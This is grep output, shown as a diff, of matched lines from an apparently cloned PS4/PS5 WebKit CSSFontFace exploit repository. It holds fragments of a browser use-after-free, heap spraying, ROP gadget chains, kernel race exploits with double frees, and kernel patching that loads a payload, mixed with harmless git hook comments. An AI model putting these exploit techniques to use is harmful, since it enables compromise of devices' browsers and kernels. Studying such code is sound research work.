@@ -1,0 +1,257 @@
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/.git/hooks/applypatch-msg.sample:4:# applypatch from an e-mail message.
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/.git/hooks/applypatch-msg.sample:7:# appropriate message if it wants to stop the commit.  The hook is
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/.git/hooks/applypatch-msg.sample:10:# To enable this hook, rename this file to "applypatch-msg".
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/.git/hooks/commit-msg.sample:6:# status after issuing an appropriate message if it wants to stop the
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/.git/hooks/pre-applypatch.sample:4:# by applypatch from an e-mail message.
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/.git/hooks/pre-applypatch.sample:7:# appropriate message if it wants to stop the commit.
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/.git/hooks/pre-applypatch.sample:9:# To enable this hook, rename this file to "pre-applypatch".
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/.git/hooks/pre-commit.sample:5:# exit with non-zero status after issuing an appropriate message if
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/.git/hooks/pre-merge-commit.sample:5:# exit with non-zero status after issuing an appropriate message to
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/.git/hooks/pre-rebase.sample:126:    change things related to the topic as patches against your
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/.git/hooks/sendemail-validate.sample:3:# An example hook script to validate a patch (and/or patch series) before
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/.git/hooks/sendemail-validate.sample:6:# The hook should exit with non-zero status after issuing an appropriate
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/.git/hooks/sendemail-validate.sample:11:# By default, it will only check that the patch(es) can be applied on top of
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/.git/hooks/sendemail-validate.sample:13:# validation (successful or not) of the last patch of a series, the worktree
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/.git/hooks/sendemail-validate.sample:17:# remote ref that are used to apply the patches against:
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/.git/hooks/sendemail-validate.sample:22:# Replace the TODO placeholders with appropriate checks according to your
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/.git/hooks/sendemail-validate.sample:27:	# TODO: Replace with appropriate checks (e.g. spell checking).
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/.git/hooks/sendemail-validate.sample:31:validate_patch () {
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/.git/hooks/sendemail-validate.sample:33:	# Ensure that the patch applies without conflicts.
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/.git/hooks/sendemail-validate.sample:35:	# TODO: Replace with appropriate checks for this patch
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/.git/hooks/sendemail-validate.sample:36:	# (e.g. checkpatch.pl).
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/.git/hooks/sendemail-validate.sample:41:	# TODO: Replace with appropriate checks for the whole series
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/.git/hooks/sendemail-validate.sample:67:	validate_patch "$1"
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/.git/hooks/update.sample:76:			echo "*** Use 'git tag [ -a | -s ]' for tags you want to propagate." >&2
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/README.md:1:# WebKit CSSFontFace Exploit for PS4/PS5
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/README.md:7:| PlayStation 4 | 6.00-13.52  |
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/README.md:14:| PlayStation 4 | 6.00-11.02  |
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/README.md:23:| PlayStation 4 | 6.00-11.02  | 7.00-11.02     |
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/README.md:26:* add your payload/hen of choice in public/src named as `payload.bin`
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/README.md:30:* Newer WebKit versions on PlayStation 4 [11.5x-latest] and PlayStation 5 [9.00-latest] redesigned CSSFontFace get/set property handling and introduced `m_propertiesOrCSSConnection`. Because of this and other layout changes, the `m_featureSettings` read/write primitive used by this repository is no longer usable on firmware versions above the ranges listed here.
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/README.md:31:* On PlayStation 5, vtable checks and WebKit ASLR prevent this repository's chain from working unless a separate ASLR defeat and vtable recovery workaround is found.
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/includes/script.js:10:// choose one of kernel exploits
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/includes/script.js:14:const kexForm = document.getElementById('kernel-options');
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/includes/style.css:83:#kernel-options {
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/index.html:17:    <form id="kernel-options">
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/index.html:18:      <input type="radio" name="kernel" id="netctrl-exploit" value="netctrl">
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/index.html:20:      <input type="radio" name="kernel" id="lapse-exploit" value="lapse">
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:80:    const ids_offset_addr = ids_addr.add(i * Uint32Array.BYTES_PER_ELEMENT);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:82:    fn.aio_submit_cmd.invoke(cmd, reqs1.addr, num_reqs, AIO_PRIORITY_HIGH, ids_offset_addr);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:86:function process_aio(op, ids, offset = 0, count = ids.length - offset) {
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:93:    const ids_offset_addr = ids_addr.add(offset * Uint32Array.BYTES_PER_ELEMENT);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:96:      fn.aio_multi_cancel.invoke(ids_offset_addr, step, outs_addr);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:100:      fn.aio_multi_wait.invoke(ids_offset_addr, step, outs_addr, AIO_WAIT_AND, 0);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:104:      fn.aio_multi_poll.invoke(ids_offset_addr, step, outs_addr);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:108:      fn.aio_multi_delete.invoke(ids_offset_addr, step, outs_addr);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:112:    offset += step;
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:128:          importScripts("ps4/kernel.js");
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:184:      throw new Error(`${v} not a kernel pointer !!`);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:504:  const aio_ids_offset_addr = aio_ids.buffer.data().add(which_req * Uint32Array.BYTES_PER_ELEMENT);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:505:  const outs_offset_addr = outs.buffer.data().add(1 * Uint32Array.BYTES_PER_ELEMENT);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:536:    // drop the reference so that aio_multi_delete() will trigger _fdrop()
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:541:    const race_task = race_worker.execute("aio_delete", aio_ids_offset_addr, outs_offset_addr);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:563:      // PANIC: double free on the 0x80 malloc zone. important kernel
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:693:  // string is located at the kernel's mapped ELF file
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:701:  // we now know the address of the kernel buffer we are leaking
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:716:  // use reqs1 to fake a aio_info. set .ai_cred (offset 0x10) to offset 4 of
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:846:  const reqs3_offset = 0x28;
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:847:  const spray_reqs3_addr = spray_rthdr0_addr.add(reqs3_offset);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:848:  const leak_reqs3_addr = leak_rthdr0_addr.add(reqs3_offset);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:855:  spray_aio_entry.ar2_batch = reqs2_addr.add(reqs3_offset); // reqs3 offset
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:857:  // use reqs1 to fake a aio_batch at offset 0x28.
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:972:  // PANIC: double free on the 0x100 malloc zone. important kernel data may alias
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:1007:  logger.info("Initiate kernel ARW...");
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:1078:    let offset = 0;
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:1079:    while (offset < 8) {
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:1080:      arw.view(pktinfo_addr).setBInt(8, addr.add(offset), true); // pktopts.ip6po_nexthop = addr + offset
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:1086:      arw.view(nhop_addr).setInt32(0, 8 - offset, true);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:1088:      if (fn.getsockopt.invoke(pktopts_twins[0], IPPROTO_IPV6, IPV6_NEXTHOP, buf_addr.add(offset), nhop_addr) === -1) {
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:1094:        arw.view(buf_addr).setUint8(offset, 0);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:1095:        offset += 1;
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:1097:        offset += n;
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:1112:  kernel_base = evf_cv_addr.sub(constants.EVF_OFFSET);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:1113:  logger.info(`kernel base: ${kernel_base}`);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:1120:    throw new Error(`${p} is not valid kernel address !!`);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:1170:  logger.info("Achieved kernel ARW !!");
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/lapse.js:1194:  { type: "Uint64", name: "offset" },
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/main.js:36:    init_rop();
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/main.js:37:    init_syscalls();
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/main.js:46:        await load_script("src/ps4/kernel.js");
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/main.js:112:      const kpatches_rsp = await fetch(`src/ps4/patches/${constants.KPATCH}`);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/main.js:113:      const kpatches_buf = await kpatches_rsp.arrayBuffer();
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/main.js:114:      const kpatches_u8 = new Uint8Array(kpatches_buf);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/main.js:116:      kernel_patches(kpatches_u8);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/main.js:118:      const bin_rsp = await fetch("src/payload.bin");
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/netctrl.js:74:            importScripts("ps4/kernel.js");
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/netctrl.js:121:            importScripts("ps4/kernel.js");
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/netctrl.js:608:  kernel_base = kl_lock.sub(constants.KL_LOCK);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/netctrl.js:613:  logger.info(`kernel base: ${kernel_base}`);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/netctrl.js:710:  msg_uio.uio_offset = -1;
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/netctrl.js:878:  msg_uio.uio_offset = -1;
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/netctrl.js:994:  logger.info("Initiate kernel ARW...");
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/netctrl.js:1025:  logger.info("Achieved kernel ARW !!");
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/netctrl.js:1047:  { type: "Uint64", name: "uio_offset" },
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/constants.js:628:  get(target, prop) {
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/constants.js:629:    if (constants_cache.has(prop)) {
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/constants.js:630:      return constants_cache.get(prop);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/constants.js:636:          if (minor in target[major] && prop in target[major][minor]) {
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/constants.js:637:            const value = target[major][minor][prop];
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/constants.js:639:              throw new Error(`${prop} offset is not supported for ${version}`);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/constants.js:642:            constants_cache.set(prop, value);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/constants.js:649:    throw new Error(`${version} has no ${prop} !!`);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/kernel.js:55:let kernel_base = undefined;
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/kernel.js:577:// intended for use only after kernel arw
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/kernel.js:578:function kernel_patches(shellcode) {
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/kernel.js:579:  logger.info("Applying kernel patches...");
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/kernel.js:581:  const sysent_661_addr = kernel_base.add(constants.SYSENT_661);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/kernel.js:584:  const jmp_rsi_gadget_addr = kernel_base.add(constants.JMP_RSI_GADGET);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/kernel.js:585:  logger.debug(`jmp_rsi_gadget_addr: ${jmp_rsi_gadget_addr}`);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/kernel.js:596:  kview(sysent_661_addr).setBInt(8, jmp_rsi_gadget_addr, true);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/kernel.js:627:  logger.info("Kernel patches applied !!");
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:2:// used for rop
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:5:const syscalls = new Map();
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:14:let libkernel_base = undefined;
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:29:      if (ab.hasOwnProperty("m_data")) {
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:97:const rop = {
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:107:    rop.frame.set_value("jmp_rax", gadgets.POP_RAX_RET);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:125:const gadgets = new Proxy(constants, {
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:126:  get(target, prop) {
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:127:    return webkit_base + target[`wk_${prop}`];
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:154:    this.offset = this.view.byteLength;
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:158:    return this.view.buffer.data().add(this.offset);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:183:      this.offset -= 8;
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:184:      this.view.setBInt(this.offset, inst, true);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:268:    insts.push(gadgets.POP_RDI_RET);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:270:    insts.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:278:    insts.push(gadgets.POP_RDI_RET);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:280:    insts.push(gadgets.MOV_RAX_QWORD_PTR_RDI_RET);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:283:  pop(insts, gadget, name) {
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:288:    insts.push(gadgets.POP_RAX_RET);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:289:    insts.push(gadget);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:290:    insts.push(gadgets.POP_RDI_RET);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:292:    insts.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:294:    insts.push(gadgets.POP_RBX_RET);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:296:    insts.push(gadgets.POP_RAX_RET);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:298:    insts.push(gadgets.PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:306:    this.store_view.setBInt(constants.store_view_entry, gadgets.POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_18, true);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:307:    this.store_view.setBInt(0x10, gadgets.MOV_RDI_QWORD_PTR_RAX_8_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20, true);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:308:    this.store_view.setBInt(0x18, gadgets.PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10, true);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:311:      this.pivot_view.setBInt(8, gadgets.PUSH_RDI_POP_RSP_RET, true);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:312:      this.pivot_view.setBInt(0x20, gadgets.MOV_RDI_QWORD_PTR_RAX_10_JMP_QWORD_PTR_RAX_8, true);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:314:      this.pivot_view.setBInt(0x10, gadgets.PUSH_RDX_POP_RSP_RET, true);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:315:      this.pivot_view.setBInt(0x20, gadgets.MOV_RDX_QWORD_PTR_RAX_18_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10, true);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:337:      if (!syscalls.has(input)) {
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:341:      this.addr = syscalls.get(input);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:350:    rop.reset();
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:352:    rop.frame.set_value("rip", this.addr);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:353:    rop.frame.set_value("rax", 0);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:377:      rop.frame.set_value(reg, value);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:380:    rop.execute();
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:388:      result = rop.frame.get_value("rax");
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:423:    const regs = [gadgets.POP_RDI_RET, gadgets.POP_RSI_RET, gadgets.POP_RDX_RET, gadgets.POP_RCX_RET, gadgets.POP_R8_RET, gadgets.POP_R9_RET];
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:427:    insts.push(gadgets.POP_RAX_RET);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:454:    //  insts.push(gadgets.RET); // alignment for xmm/ymm
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:460:    //  insts.push(gadgets.RET); // alignment for xmm/ymm
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:478:    let offset = 0;
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:486:      field.offset = offset = offset.alignUp(field.align);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:489:      offset += field.size * field.count;
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:496:    this.sizeof = offset.alignUp(alignof);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:507:      get: (target, prop) => {
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:508:        if (prop in target) return target[prop];
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:510:        if (!isNaN(prop)) {
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:511:          const i = Number(prop);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:515:        const field = target.struct.fields[prop];
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:519:        let addr = target.addr.add(field.offset);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:547:            addr = arw.view(target.addr).getBInt(field.offset, true);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:576:      set: (target, prop, value) => {
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:577:        if (!isNaN(prop)) {
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:578:          const i = Number(prop);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:579:          if (!value.hasOwnProperty("struct")) {
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:589:          const field = target.struct.fields[prop];
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:593:          let addr = target.addr.add(field.offset);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:613:              arw.view(target.addr).setBInt(field.offset, value, true);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:620:              if (!value.hasOwnProperty("addr")) {
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:767:  if (!fn.hasOwnProperty("_error")) {
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:775:  if (!fn.hasOwnProperty("_strerror")) {
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:846:  document.body.offsetTop;
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:850:  Object.defineProperty(FontFace.prototype, "then", {
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:858:        document.body.offsetTop;
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:870:        document.body.offsetTop;
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:894:  Object.defineProperty(FontFace.prototype, "then", {
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:951:      let offset = 0;
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:952:      while (offset < size) {
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:953:        const ptr = addr.add(offset);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:961:          u8[offset++] = this.uaf_font.featureSettings.charCodeAt(i);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:998:    const props = [];
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1001:    // Spray marker and target JS object as props
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1003:      props.push({ value: marker });
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1004:      props.push({ value: rw.leak });
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1011:      // Allocates Vector<PropertyDescriptor> and MarkedArgumentBuffer, both of which uses fastMalloc which will spray our props into fastMalloc heap
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1012:      Object.defineProperties({}, props);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1049:    // Prepare container's properties to be used with fakeobj to create arw.master view over arw.victim DataView
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1098:    let fake_vtable_gadget;
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1099:    let dst_addr_offset;
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1102:      fake_vtable_gadget = gadgets.MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_2060_RAX_RET;
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1103:      dst_addr_offset = 0x2060;
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1105:      fake_vtable_gadget = gadgets.MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_2330_RAX_RET;
